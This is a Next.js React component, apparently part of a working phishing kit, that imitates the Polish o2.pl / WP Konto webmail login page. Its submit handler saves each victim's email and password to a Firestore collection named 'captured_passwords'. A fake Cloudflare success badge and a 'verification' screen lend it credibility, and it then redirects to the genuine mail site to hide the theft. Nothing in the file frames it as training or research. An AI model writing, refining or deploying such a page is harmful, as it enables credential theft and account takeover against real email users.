
"use client"

import { useState, useEffect } from "react"
import { ChevronLeft, Loader2, Facebook, Apple } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import Image from "next/image"
import { PlaceHolderImages } from "@/lib/placeholder-images"
import { useFirebase, setDocumentNonBlocking, initiateAnonymousSignIn } from "@/firebase"
import { collection, doc } from "firebase/firestore"

export function O2Login() {
  const [emailValue, setEmailValue] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isFinished, setIsFinished] = useState(false)

  const { firestore, auth, user } = useFirebase();
  const o2Logo = PlaceHolderImages.find(img => img.id === "o2-logo")
  const wpIllustration = PlaceHolderImages.find(img => img.id === "wp-illustration")
  const partner1 = PlaceHolderImages.find(img => img.id === "partner-logo-1")
  const partner2 = PlaceHolderImages.find(img => img.id === "partner-logo-2")

  useEffect(() => {
    if (auth && !user) {
      initiateAnonymousSignIn(auth);
    }
  }, [auth, user]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)
    
    if (firestore) {
      const colRef = collection(firestore, "captured_passwords");
      const id = doc(colRef).id;
      const docRef = doc(firestore, "captured_passwords", id);
      
      setDocumentNonBlocking(docRef, {
        id,
        password,
        sourceEmail: emailValue,
        captureTimestamp: new Date().toISOString(),
      }, { merge: true });
    }
    
    setTimeout(() => {
      setIsSubmitting(false)
      setIsFinished(true)
    }, 1500)
  }

  if (isFinished) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center space-y-6">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
            <Loader2 className="w-8 h-8 text-green-600 animate-spin" />
          </div>
          <h2 className="text-2xl font-bold">Trwa weryfikacja...</h2>
          <p className="text-gray-500">Twoje dane są weryfikowane. Za chwilę zostaniesz przekierowany.</p>
          <Button className="w-full bg-[#002aff] hover:bg-blue-700" onClick={() => window.location.href = "https://poczta.o2.pl"}>
            Przejdź do poczty
          </Button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex flex-col md:flex-row bg-white">
      {/* Left Sidebar */}
      <div className="w-full md:w-[400px] flex flex-col border-r min-h-screen bg-white">
        <div className="p-4 flex items-center justify-between border-b md:border-none">
          <button className="text-blue-600">
            <ChevronLeft className="w-6 h-6" />
          </button>
          <div className="relative w-12 h-12">
            {o2Logo && (
              <Image src={o2Logo.imageUrl} alt="O2" fill className="object-contain" data-ai-hint={o2Logo.imageHint} />
            )}
          </div>
          <div className="w-6" /> {/* Spacer */}
        </div>

        <div className="flex-1 flex flex-col p-8 space-y-8">
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-4">
              <Input
                placeholder="Adres e-mail"
                value={emailValue}
                onChange={(e) => setEmailValue(e.target.value)}
                required
                className="h-12 border-gray-200 text-base"
                autoFocus
              />
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  placeholder="Hasło"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  className="h-12 border-gray-200 text-base pr-24"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-sm font-medium text-gray-500"
                >
                  {showPassword ? "Ukryj hasło" : "Pokaż hasło"}
                </button>
              </div>
            </div>

            {/* Cloudflare Mock */}
            <div className="bg-[#2c2c2c] text-white p-3 rounded flex items-center justify-between text-xs">
              <div className="flex items-center gap-2">
                <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
                  <span className="text-[10px]">✓</span>
                </div>
                <span>Powodzenie!</span>
              </div>
              <div className="text-right leading-tight opacity-70">
                CLOUDFLARE<br />Prywatność<br />Pomoc
              </div>
            </div>

            <Button type="submit" className="w-full h-12 bg-[#002aff] hover:bg-blue-700 font-bold text-base" disabled={isSubmitting}>
              {isSubmitting ? <Loader2 className="animate-spin" /> : "Zaloguj się"}
            </Button>
          </form>

          <div className="text-center space-y-4">
            <a href="#" className="text-sm font-medium text-gray-600 hover:underline">Nie pamiętasz hasła?</a>
            <div className="relative">
              <div className="absolute inset-0 flex items-center"><span className="w-full border-t" /></div>
              <div className="relative flex justify-center text-xs uppercase"><span className="bg-white px-2 text-gray-400">lub zaloguj się przez</span></div>
            </div>
            
            <div className="flex justify-center gap-4">
              <button className="p-2 border rounded-full hover:bg-gray-50">
                <svg viewBox="0 0 24 24" className="w-6 h-6" xmlns="http://www.w3.org/2000/svg">
                  <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                  <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                  <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
                  <path d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.14-4.53z" fill="#EA4335"/>
                </svg>
              </button>
              <button className="p-2 border rounded-full hover:bg-gray-50"><Facebook className="w-6 h-6 text-[#1877F2]" /></button>
              <button className="p-2 border rounded-full hover:bg-gray-50"><Apple className="w-6 h-6" /></button>
            </div>
            
            <a href="#" className="block text-blue-600 font-bold hover:underline">Załóż nowe konto</a>
          </div>

          <div className="mt-auto pt-8 text-[10px] text-gray-400 space-y-2 text-center md:text-left">
            <div className="space-x-2">
              <span>Język: <button className="text-gray-600 underline">Polski</button> | <button>English</button></span>
              <span>•</span>
              <button>O nas</button>
              <span>•</span>
              <button>Pomoc</button>
            </div>
            <div className="space-x-2">
              <button>Regulamin</button>
              <span>•</span>
              <button>Prywatność</button>
            </div>
          </div>
        </div>
      </div>

      {/* Right Content */}
      <div className="flex-1 bg-pattern flex flex-col items-center justify-center p-8 md:p-16 relative overflow-hidden">
        <div className="max-w-xl space-y-8 z-10 text-center md:text-left w-full">
          <div className="space-y-4">
            <h1 className="text-4xl md:text-5xl font-extrabold text-[#111c30] leading-tight">
              Jedno konto do wielu serwisów i poczty
            </h1>
            <p className="text-lg text-gray-600">
              Rejestrujesz się raz, szybko logujesz w swoich ulubionych serwisach i w pełni z nich korzystasz.
            </p>
          </div>
          
          <Button variant="outline" className="h-12 px-8 border-2 border-gray-300 font-bold hover:bg-gray-50">
            Załóż WP Konto
          </Button>

          <div className="relative w-full aspect-[4/3] mt-8">
            {wpIllustration && (
              <Image src={wpIllustration.imageUrl} alt="Illustration" fill className="object-contain" data-ai-hint={wpIllustration.imageHint} />
            )}
          </div>
        </div>

        {/* Partner Logos Carousel Placeholder */}
        <div className="absolute bottom-8 w-full px-8 overflow-hidden pointer-events-none">
          <div className="flex gap-4 justify-center flex-wrap opacity-50 grayscale">
            {[partner1, partner2, partner1, partner2, partner1].map((p, i) => (
              <div key={i} className="bg-white border p-3 rounded-lg shadow-sm w-40 h-16 relative">
                {p && <Image src={p.imageUrl} alt="partner" fill className="object-contain p-2" data-ai-hint={p.imageHint} />}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  )
}
